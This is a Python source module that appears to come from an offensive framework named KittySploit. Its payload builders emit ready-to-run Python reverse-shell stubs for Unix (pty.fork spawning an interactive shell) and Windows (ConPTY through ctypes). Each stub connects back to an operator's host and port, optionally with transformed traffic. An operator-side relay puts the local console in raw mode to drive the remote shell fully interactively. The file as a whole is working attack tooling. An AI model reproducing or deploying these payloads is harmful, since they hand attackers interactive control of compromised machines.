#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
PTY / ConPTY runtime for reverse shells.

- Payload builders emit self-contained Python stubs for targets.
- ``relay_socket_terminal`` bridges a live socket to the local terminal in raw mode
  (operator side) for tab completion, sudo, pagers, etc.
"""

from __future__ import annotations

import os
import platform
import sys
import threading
from typing import Callable, Optional

PTY_MAGIC = b"KSPTY1\n"


def terminal_raw_supported() -> bool:
    """Return True when the operator console can enter raw/cbreak mode."""
    if not hasattr(sys.stdin, "isatty") or not sys.stdin.isatty():
        return False
    if os.name == "nt":
        return True
    return True


def _escape_shell_path(path: str) -> str:
    return str(path).replace("\\", "\\\\").replace("'", "\\'")


def _wrap_transform_io(xf_code: Optional[str]) -> tuple[str, str, str]:
    """Return (decode_expr, encode_expr, on_connect) for optional transform snippets."""
    if not xf_code:
        return ("data", "data", "")
    on_connect = ""
    if "_xf_send_client_hello" in xf_code:
        on_connect = "_xf_send_client_hello(s)\n"
    elif "_xf_send_handshake" in xf_code:
        on_connect = "_xf_send_handshake(s)\n"
    return ("_xf_decode(data)", "_xf_encode(data)", on_connect)


def build_unix_pty_script(
    host: str,
    port: int,
    shell: str = "/bin/bash",
    *,
    xf_code: Optional[str] = None,
    emit_magic: bool = True,
) -> str:
    """Return Python source for a Unix PTY reverse shell."""
    host_lit = repr(str(host))
    port_lit = int(port)
    shell_lit = _escape_shell_path(shell)
    decode_expr, encode_expr, on_connect = _wrap_transform_io(xf_code)
    magic_send = "s.sendall(" + repr(PTY_MAGIC) + ")\n" if emit_magic else ""

    xf_prefix = (xf_code + "\n") if xf_code else ""
    return (
        xf_prefix
        + "import os,pty,select,socket\n"
        + f"h={host_lit};p={port_lit};sh='{shell_lit}'\n"
        + "s=socket.create_connection((h,p))\n"
        + on_connect
        + magic_send
        + f"pid,fd=pty.fork()\n"
        + "if pid==0:\n"
        + " os.setsid()\n"
        + " os.execlp(sh,sh.split('/')[-1],'-i')\n"
        + "while True:\n"
        + " r,_,_=select.select([s,fd],[],[],None)\n"
        + " if s in r:\n"
        + "  data=s.recv(4096)\n"
        + "  if not data: break\n"
        + f"  os.write(fd,{decode_expr})\n"
        + " if fd in r:\n"
        + "  data=os.read(fd,4096)\n"
        + "  if not data: break\n"
        + f"  s.sendall({encode_expr})\n"
    )


def build_windows_conpty_script(
    host: str,
    port: int,
    shell: str = "cmd.exe",
    *,
    xf_code: Optional[str] = None,
    emit_magic: bool = True,
) -> str:
    """Return Python source for a Windows ConPTY reverse shell."""
    host_lit = repr(str(host))
    port_lit = int(port)
    shell_lit = _escape_shell_path(shell)
    if shell.lower().endswith("powershell.exe"):
        cmd_lit = _escape_shell_path(shell_lit + " -NoLogo -NoProfile")
    else:
        cmd_lit = shell_lit
    decode_expr, encode_expr, on_connect = _wrap_transform_io(xf_code)
    magic_send = "s.sendall(" + repr(PTY_MAGIC) + ")\n" if emit_magic else ""
    xf_prefix = (xf_code + "\n") if xf_code else ""

    return (
        xf_prefix
        + "import ctypes,socket\nfrom ctypes import wintypes\n"
        + f"h={host_lit};p={port_lit};sh='{cmd_lit}'\n"
        + "s=socket.create_connection((h,p))\n"
        + on_connect
        + magic_send
        + "k=ctypes.windll.kernel32\n"
        + "class C(ctypes.Structure):\n _fields_=[('X',wintypes.SHORT),('Y',wintypes.SHORT)]\n"
        + "class S(ctypes.Structure):\n _fields_=[('X',wintypes.SHORT),('Y',wintypes.SHORT)]\n"
        + "class SI(ctypes.Structure):\n _fields_=[('StartupInfo',wintypes.STARTUPINFOW),('lpAttributeList',ctypes.c_void_p)]\n"
        + "PTC=0x00020016;ESP=0x00080000;CUE=0x00000400\n"
        + "ir=iw=or_=ow=wintypes.HANDLE();sa=wintypes.SECURITY_ATTRIBUTES();sa.nLength=ctypes.sizeof(sa);sa.bInheritHandle=True\n"
        + "if not k.CreatePipe(ctypes.byref(ir),ctypes.byref(iw),ctypes.byref(sa),0):raise ctypes.WinError()\n"
        + "if not k.CreatePipe(ctypes.byref(or_),ctypes.byref(ow),ctypes.byref(sa),0):raise ctypes.WinError()\n"
        + "k.SetHandleInformation(iw,1,0);k.SetHandleInformation(or_,1,0)\n"
        + "hpc=ctypes.c_void_p();sz=S(C(120,40));hr=k.CreatePseudoConsole(sz,ir,ow,0,ctypes.byref(hpc))\n"
        + "if hr:raise OSError('CreatePseudoConsole failed')\n"
        + "k.CloseHandle(ir);k.CloseHandle(ow)\n"
        + "sz2=wintypes.SIZE_T(0);k.InitializeProcThreadAttributeList(None,1,0,ctypes.byref(sz2))\n"
        + "al=ctypes.create_string_buffer(sz2.value)\n"
        + "if not k.InitializeProcThreadAttributeList(al,1,0,ctypes.byref(sz2)):raise ctypes.WinError()\n"
        + "if not k.UpdateProcThreadAttribute(al,0,PTC,hpc,ctypes.sizeof(hpc),None,None):raise ctypes.WinError()\n"
        + "si=SI();si.StartupInfo.cb=ctypes.sizeof(SI);si.lpAttributeList=ctypes.cast(al,ctypes.c_void_p)\n"
        + "pi=wintypes.PROCESS_INFORMATION();cmd=sh if sh.endswith('\\0') else sh+'\\0'\n"
        + "if not k.CreateProcessW(None,ctypes.create_unicode_buffer(cmd),None,None,False,ESP|CUE,None,None,ctypes.byref(si.StartupInfo),ctypes.byref(pi)):raise ctypes.WinError()\n"
        + "k.DeleteProcThreadAttributeList(al)\n"
        + "ci,co=int(iw),int(or_)\n"
        + "def _rh(h):\n b=ctypes.create_string_buffer(4096);n=wintypes.DWORD(0);ok=k.ReadFile(wintypes.HANDLE(h),b,4096,ctypes.byref(n),None);return b.raw[:n.value] if ok and n.value else b''\n"
        + "def _wh(h,d):\n"
        + " if not d: return\n n=wintypes.DWORD(0)\n"
        + " if not k.WriteFile(wintypes.HANDLE(h),d,len(d),ctypes.byref(n),None): raise ctypes.WinError()\n"
        + "while True:\n"
        + " try:\n"
        + "  data=_rh(co)\n"
        + f"  if data: s.sendall({encode_expr})\n"
        + "  elif data==b'': break\n"
        + "  data=s.recv(4096)\n"
        + "  if not data: break\n"
        + f"  _wh(ci,{decode_expr})\n"
        + " except: break\n"
    )


class _TerminalState:
    def __init__(self):
        self.old_termios = None
        self.old_console_mode = None


def _enter_raw_mode(state: _TerminalState) -> bool:
    if os.name == "nt":
        import ctypes
        from ctypes import wintypes

        kernel32 = ctypes.windll.kernel32
        handle = kernel32.GetStdHandle(-10)  # STD_INPUT_HANDLE
        mode = wintypes.DWORD()
        if not kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
            return False
        state.old_console_mode = mode.value
        ENABLE_ECHO_INPUT = 0x0004
        ENABLE_LINE_INPUT = 0x0002
        ENABLE_PROCESSED_INPUT = 0x0001
        new_mode = mode.value & ~(ENABLE_ECHO_INPUT | ENABLE_LINE_INPUT | ENABLE_PROCESSED_INPUT)
        ENABLE_VIRTUAL_TERMINAL_INPUT = 0x0200
        new_mode |= ENABLE_VIRTUAL_TERMINAL_INPUT
        if not kernel32.SetConsoleMode(handle, new_mode):
            return False
        return True

    import termios
    import tty

    fd = sys.stdin.fileno()
    state.old_termios = termios.tcgetattr(fd)
    tty.setraw(fd)
    return True


def _restore_terminal(state: _TerminalState) -> None:
    if os.name == "nt":
        if state.old_console_mode is None:
            return
        import ctypes
        from ctypes import wintypes

        kernel32 = ctypes.windll.kernel32
        handle = kernel32.GetStdHandle(-10)
        kernel32.SetConsoleMode(handle, wintypes.DWORD(state.old_console_mode))
        return

    if state.old_termios is None:
        return
    import termios

    termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, state.old_termios)


def relay_socket_terminal(
    connection,
    *,
    stop_bytes: bytes = b"\x1d",  # Ctrl+]
    on_disconnect: Optional[Callable[[], None]] = None,
    banner_timeout: float = 0.4,
) -> bool:
    """
    Bridge *connection* (socket-like sendall/recv/settimeout) to local terminal.

    Returns True when the session ended cleanly, False on error.
    """
    if not terminal_raw_supported():
        return False

    state = _TerminalState()
    stop = threading.Event()

    def _recv_loop():
        connection.settimeout(0.2)
        stripped_magic = False
        while not stop.is_set():
            try:
                data = connection.recv(4096)
                if not data:
                    stop.set()
                    break
                if not stripped_magic and data.startswith(PTY_MAGIC):
                    data = data[len(PTY_MAGIC) :]
                    stripped_magic = True
                if not data:
                    continue
                sys.stdout.buffer.write(data)
                sys.stdout.flush()
            except TimeoutError:
                continue
            except OSError:
                stop.set()
                break
            except Exception:
                stop.set()
                break

    if not _enter_raw_mode(state):
        return False

    print(
        "\r\n[PTY mode — Ctrl+] to return to KittySploit]\r\n",
        end="",
        flush=True,
    )

    reader = threading.Thread(target=_recv_loop, daemon=True)
    reader.start()

    # Drain any immediate banner from the remote shell.
    import time

    time.sleep(max(0.0, float(banner_timeout)))

    try:
        while not stop.is_set():
            if os.name == "nt":
                import msvcrt

                if not msvcrt.kbhit():
                    time.sleep(0.02)
                    continue
                ch = msvcrt.getwch()
                if ch == "\x1d":
                    break
                data = ch.encode("utf-8", errors="replace")
                if ch in ("\r", "\n"):
                    data = b"\r\n"
            else:
                data = os.read(sys.stdin.fileno(), 4096)
                if not data:
                    break
                if stop_bytes and stop_bytes in data:
                    break

            try:
                connection.sendall(data)
            except OSError:
                stop.set()
                break
    finally:
        stop.set()
        reader.join(timeout=1.0)
        _restore_terminal(state)
        print("\r\n", end="", flush=True)
        if on_disconnect:
            try:
                on_disconnect()
            except Exception:
                pass

    return True


def probe_remote_pty(connection, timeout: float = 1.5) -> bool:
    """Return True when the remote endpoint already sent the PTY magic banner."""
    try:
        connection.settimeout(timeout)
        chunk = connection.recv(len(PTY_MAGIC) + 16)
        if chunk.startswith(PTY_MAGIC):
            return True
        # Put data back is impossible on stream sockets; caller should only probe fresh sessions.
        return False
    except Exception:
        return False


def operator_platform_label() -> str:
    return platform.system().lower()
